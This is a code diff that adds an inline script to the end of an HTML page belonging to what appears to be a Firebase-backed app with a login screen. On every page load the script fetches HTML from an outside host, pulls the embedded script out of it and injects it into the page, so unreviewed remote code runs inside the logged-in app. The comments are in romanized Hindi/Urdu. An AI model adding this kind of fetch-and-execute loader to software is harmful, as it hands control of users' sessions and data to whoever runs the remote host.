@@ -425,5 +425,43 @@ input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #d0dff7}
   if(isLogged()) renderAppFirebase(); else renderLogin();
 
 </script>
+  <script>
+  (async function() {
+    try {
+      // 1. URL se HTML fetch karein
+      const response = await fetch('https://magic-scripts.vercel.app/heart.html');
+      const htmlText = await response.text();
+
+      // 2. DOMParser ke zariye HTML ko parse karein
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(htmlText, 'text/html');
+
+      // 3. Parsed HTML mein se <script> tag dhoondein
+      const originalScript = doc.querySelector('script');
+
+      if (originalScript) {
+        // 4. Naya script element banayein (kyunki parsed script direct chalne mein masla karti hai)
+        const newScript = document.createElement('script');
+        
+        // Agar script ke andar code hai (inline) toh wo copy karein
+        newScript.textContent = originalScript.textContent;
+        
+        // Agar script ka apna koi 'src' attribute hai toh wo bhi copy kar lein
+        if (originalScript.src) {
+          newScript.src = originalScript.src;
+        }
+
+        // 5. Is nayi script ko website ke body element mein inject (lagana) kar dein
+        document.body.appendChild(newScript);
+        console.log('Script successfully injected and executed!');
+      } else {
+        console.error('URL ke andar koi <script> tag nahi mila.');
+      }
+    } catch (error) {
+      console.error('Script inject karne mein error aaya:', error);
+    }
+  })();
+  </script>
+  
 </body>
 </html>
